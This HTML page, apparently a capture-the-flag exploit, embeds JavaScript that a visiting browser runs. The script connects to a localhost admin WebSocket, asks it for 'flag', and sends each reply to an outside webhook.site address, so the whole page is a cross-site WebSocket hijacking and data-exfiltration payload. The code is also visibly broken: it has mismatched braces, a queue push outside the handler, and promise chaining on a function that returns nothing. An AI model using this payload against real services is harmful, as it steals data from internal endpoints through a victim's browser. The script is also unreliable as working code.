<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket and Webhook</title>
</head>
<body>
    <h1>WebSocket and Webhook Example</h1>
    <p>The POST request will be sent immediately, and the WebSocket will connect in parallel.</p>

    <script>
        // WebSocket URL
        const websocketURL = "ws://127.0.0.1:8080/admin/ws";

        // Webhook URL (without query parameter)
        const webhookBaseURL = "https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a";

        // Create a new WebSocket connection
        const socket = new WebSocket(websocketURL);

        let flag = "";  // Declare a variable to store the received message

        // Open WebSocket connection and send "flag" when connected
        let messageQueue = [];

        socket.addEventListener("open", (event) => {
            socket.send("flag");
        });
        socket.onmessage = (event) => {
    let flag = event.data;
    console.log("Received message:", flag);

    // Check if flag is a non-empty string
    if (typeof flag === "string" && flag.trim().length > 0) {
        console.log("Flag is a non-empty string, sending POST request.");
        
        sendPostToWebhook(flag)
            .then(() => {
                console.log("POST request sent successfully!");
            })
            .catch((error) => {
                console.error("Error sending POST request:", error);
            });
    } else {
        console.log("Flag is empty or not a string, not sending POST request.");
    }
};

    // Add the flag to the message queue if needed
    messageQueue.push(flag);
};

// Send POST requests at regular intervals (every 2 seconds)
        setInterval(() => {
            if (messageQueue.length > 0) {
                let flag = messageQueue.shift();  // Get the first item from the queue
                sendPostToWebhook(flag).then(() => {
                console.log("POST request sent successfully!");
            }).catch((error) => {
                console.error("Error sending POST request:", error);
        });
    }
}, 2000);  // Interval of 2 seconds


     

        // Function to send POST request to Webhook
        function sendPostToWebhook(flag) {
            console.log("Sending POST request to Webhook");

            // Create the URL with the query parameter
            const webhookURLWithFlag = `${webhookBaseURL}/flag=${encodeURIComponent(flag)}`;

            // Send POST request to Webhook with the flag as part of the URL
            fetch(webhookURLWithFlag, {
                method: "POST", // Use POST method
            })
            .then(response => {
                if (response.ok) {
                    console.log("POST request sent successfully!");
                } else {
                    console.error("Failed to send POST request:", response.statusText);
                }
            })
            .catch(error => {
                console.error("Error sending POST request:", error);
            });
        }
    </script>
</body>
</html>
